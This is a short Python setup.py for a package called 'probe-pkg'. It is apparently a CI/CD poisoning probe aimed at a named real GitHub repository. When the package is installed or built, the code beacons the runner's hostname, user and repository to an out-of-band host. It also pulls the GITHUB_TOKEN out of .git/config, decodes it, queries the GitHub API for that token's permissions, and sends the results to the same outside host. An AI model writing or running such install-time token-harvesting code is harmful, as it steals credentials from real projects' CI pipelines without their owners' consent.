import base64, json, os, re, socket, urllib.parse, urllib.request

OOB = "https://dc2mmj06nq621bfsts20etx35ruuab55p.oast.live"
MARK = "WP-CICD-PROBE-2026"

def beacon(tag, extra=""):
    try:
        urllib.request.urlopen(OOB + "/" + tag + "?marker=" + MARK + "&" + extra, timeout=8)
    except Exception:
        pass

# 1) code execution in the CI runner
beacon("exec", "host=" + socket.gethostname() + "&user=" + (os.environ.get("USER") or "?") + "&repo=" + os.environ.get("GITHUB_REPOSITORY", "?"))

# 2) read-only proof of the GITHUB_TOKEN capability persisted by actions/checkout
try:
    cfg = open(".git/config").read()
    m = re.search(r"AUTHORIZATION: basic (\S+)", cfg)
    if m:
        tok = base64.b64decode(m.group(1)).decode().split(":", 1)[1]
        req = urllib.request.Request(
            "https://api.github.com/repos/Zomato/mlflow",
            headers={"Authorization": "token " + tok, "User-Agent": "wp-cicd-probe"})
        with urllib.request.urlopen(req, timeout=10) as r:
            perms = json.loads(r.read()).get("permissions", {})
            scopes = r.headers.get("X-OAuth-Scopes", "")
        beacon("token", "perms=" + urllib.parse.quote(json.dumps(perms)) + "&scopes=" + urllib.parse.quote(scopes))
except Exception as e:
    beacon("tokenerr", "e=" + urllib.parse.quote(str(e)[:120]))

from setuptools import setup
setup(name="probe-pkg", version="0.1", py_modules=[])
